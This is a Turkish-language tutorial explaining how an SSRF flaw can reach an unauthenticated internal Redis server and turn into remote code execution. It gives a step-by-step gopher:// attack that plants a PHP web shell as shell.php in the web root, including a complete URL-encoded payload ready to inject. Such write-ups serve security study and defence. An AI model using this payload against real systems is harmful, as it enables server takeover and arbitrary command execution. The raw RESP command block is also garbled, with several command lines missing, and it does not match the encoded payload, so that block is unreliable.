Server-Side Request Forgery (SSRF) genellikle bir bilgi sızdırma ve ağ tarama zafiyeti olarak görülse de, belirli koşullar altında Uzaktan Kod Çalıştırma (Remote Code Execution - RCE) için bir basamak taşı olabilir. Bu, genellikle SSRF'nin, komutları veya verileri tehlikeli bir şekilde işleyen bir iç ağ servisiyle etkileşime girmesine izin verdiği durumlarda mümkündür.

Bu senaryoların en bilineni, kimlik doğrulaması olmayan bir Redis sunucusunu sömürmektir.

### Senaryo: RCE için Redis'i Kötüye Kullanma

**Bağlam:** Redis, genellikle önbellekleme veya oturum yönetimi için kullanılan, bellekte çalışan hızlı bir anahtar-değer deposudur. Geliştiriciler bazen Redis'i yalnızca iç ağdan erişilebilir olacak şekilde, herhangi bir parola koruması olmadan kurarlar. Eğer bir SSRF zafiyeti bu korumasız Redis sunucusuna istek gönderebiliyorsa, bu durum RCE'ye yol açabilir.

**Teknik:** Saldırgan, SSRF zafiyetini ve

gopher://

URL şemasını kullanarak Redis sunucusuna ham komutlar gönderir. Amaç, Redis'in veritabanını web sunucusunun erişebileceği bir dizine (örn:

/var/www/html

) bir PHP web shell'i olarak kaydetmesini sağlamaktır.

Adım Adım Sömürü

Saldırgan, aşağıdaki Redis komutlarını sırayla göndermek için tek bir Gopher payload'u oluşturur:

1. **
    
    FLUSHALL
    
    **: Önceki verilerden kurtulmak için Redis veritabanını temizler.
2. **
    
    SET shell "<?php system($_GET['cmd']); ?>"
    
    **: 
    
    shell
    
     adında bir anahtar oluşturur ve değer olarak bir PHP web shell'i içeren bir string atar. Bu örnekte güvenlik için 
    
    "<?php echo 'Merhaba'; ?>"
    
     gibi çalıştırılamayan bir string kullanılabilir.
3. **
    
    CONFIG SET dir /var/www/html/
    
    **: Redis'in çalışma dizinini web sunucusunun kök dizini olarak ayarlar.
4. **
    
    CONFIG SET dbfilename shell.php
    
    **: Redis'in veritabanı yedek dosyasının adını 
    
    shell.php
    
     olarak değiştirir.
5. **
    
    SAVE
    
    **: Redis'in mevcut veri setini (içinde bizim PHP shell'imiz olan) diskteki 
    
    shell.php
    
     dosyasına yazmasını tetikler.

Gopher Payload'u

Bu komut zinciri, Redis'in anladığı RESP (REdis Serialization Protocol) formatına dönüştürülmeli ve ardından URL-encode edilmelidir. Satır sonları için

\r\n

(

%0d%0a

) kullanılır.

Adım 1: Ham Redis Komutları

İlk olarak, göndermek istediğimiz komutları Redis protokolüne uygun, satır sonları (

\r\n

) ile ayrılmış şekilde hazırlarız.

URL-encode edilecek ham komutlar

```auto
*1
$8
FLUSHALL
*3
$3
SET
$5
shell
$32

<?php system($_GET['cmd']); ?>

*4
$6
CONFIG
$3

$3

$13

*4
$6
CONFIG
$3
SET
$10
dbfilename
$9
shell.php
*1
$4

```

_Not: PHP kodunun başındaki ve sonundaki boş satırlar (_

_\n_

_),

SET

komutunun doğru çalışması için gereklidir._

Adım 2: URL-Encode Edilmiş Gopher Payload'ı

Yukarıdaki ham komutlar, Gopher payload'unda kullanılmak üzere URL-encode edilir. Boşluklar, özel karakterler ve satır sonları (

%0d%0a

) uygun kodlara dönüştürülür.

Enjekte edilecek son payload

```auto
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Ashell%0D%0A%2432%0D%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0D%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A
```

Bu payload, SSRF zafiyeti olan bir parametreye (örn:

image_url

) enjekte edildiğinde, sunucu Redis'e bağlanarak komutları yürütecek ve web shell'i oluşturacaktır.

**Sonuç:** Eğer saldırı başarılı olursa,

http://vulnerable-site.com/shell.php

adresinde bir PHP dosyası oluşacaktır. Saldırgan daha sonra

http://vulnerable-site.com/shell.php?cmd=ls

gibi istekler göndererek sunucuda komut çalıştırabilir.

Bu teknik, SSRF'in ne kadar tehlikeli olabileceğini ve bir iç ağ servisindeki basit bir yapılandırma hatasının nasıl tam bir sistem ele geçirmeyle sonuçlanabileceğini göstermektedir.
